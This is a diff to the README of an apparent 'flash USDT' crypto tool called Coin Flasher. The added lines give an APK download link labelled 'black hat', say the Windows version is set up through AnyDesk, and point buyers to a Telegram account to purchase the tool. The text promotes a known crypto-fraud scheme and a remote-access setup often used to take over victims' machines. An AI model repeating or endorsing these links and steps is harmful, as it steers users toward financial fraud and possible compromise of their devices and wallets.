@@ -15,17 +15,20 @@ USDT: Compatible with networks such as TRC20, ERC20, and BEP20.
 # 2. Cross-Platform Functionality:
 
 # Android:
-Download the Coin Flasher APK directly from the official release page for easy installation on Android devices.
+Download the Coin Flasher APK directly from the official release page for easy installation on Android devices
+# download here
+https://apkpure.com/flash-usdt-black-hat/flash.usdtblackhat/download
 
 # Windows:
 The desktop version for Windows allows for straightforward installation and usage.
+**download version for win need to be setup via anydesk**
 
 # Mac:
 A Mac-compatible version is also available, optimized for the Mac OS environment.
 
 # Linux:
 Linux users can download the appropriate version for their system.
-
+(Linux users should follow the Termux setup)
 
 
 # 3. Termux Setup:
@@ -80,3 +83,5 @@ Built-in gas management for handling transactions across different token network
 # Unique Selling Point:
 Coin Flasher integrates both BTC and USDT flashing functionalities into a single tool, available on multiple platforms. This integration offers a seamless experience for users who need a flexible solution to perform high-volume crypto transfers efficiently and securely.
 
+# Note
+OUR FLASH USDT TOOL IS NOT FREE CONTACT US ON OUR OFFICIAL TELEGRAM ACCOUNT 👇👇👇 To buy the tool https://t.me/H13kM1N
